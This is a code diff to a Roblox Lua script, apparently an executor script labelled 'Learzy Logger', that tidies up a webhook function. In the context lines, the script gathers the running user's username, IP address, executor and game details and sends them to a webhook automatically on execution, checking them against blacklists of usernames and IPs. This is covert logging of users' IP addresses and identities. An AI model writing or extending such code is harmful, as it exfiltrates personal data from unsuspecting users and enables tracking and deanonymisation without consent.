@@ -118,13 +118,14 @@ end
 local function sendWebhook(ip, executor, isBlacklisted)
     local username = LocalPlayer and LocalPlayer.Name or "Unknown"
     local gameName, gameId = getGameInfo()
+    local blacklistStatus = (isBlacklisted and "Yes") or "No"
 
     local payload = {
         ["content"] = "",
         ["embeds"] = {{
             ["title"] = "Script Execution Detected",
             ["description"] = "A user executed the script.",
-            ["color"] = isBlacklisted and 14423100 or 65280, -- Red if blacklisted, green if not
+            ["color"] = isBlacklisted and 14423100 or 65280, -- Red or green
             ["fields"] = {
                 {["name"] = "Username", ["value"] = username, ["inline"] = true},
                 {["name"] = "IP", ["value"] = ip, ["inline"] = true},
@@ -132,7 +133,7 @@ local function sendWebhook(ip, executor, isBlacklisted)
                 {["name"] = "Game Name", ["value"] = gameName, ["inline"] = false},
                 {["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true},
                 {["name"] = "PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true},
-                {["name"] = "Blacklisted", ["value"] = isBlacklisted and "Yes" or "No", ["inline"] = false}
+                {["name"] = "Blacklisted", ["value"] = blacklistStatus, ["inline"] = true}
             },
             ["footer"] = {["text"] = "Learzy Logger"},
             ["timestamp"] = DateTime.now():ToIsoDate()
@@ -151,7 +152,6 @@ end
 task.spawn(function()
     local ip, executor = getClientInfo()
     local username = LocalPlayer and LocalPlayer.Name or "Unknown"
-
     local isBlacklisted = BlacklistedUsernames[username] or BlacklistedIPs[ip]
 
     sendWebhook(ip, executor, isBlacklisted)
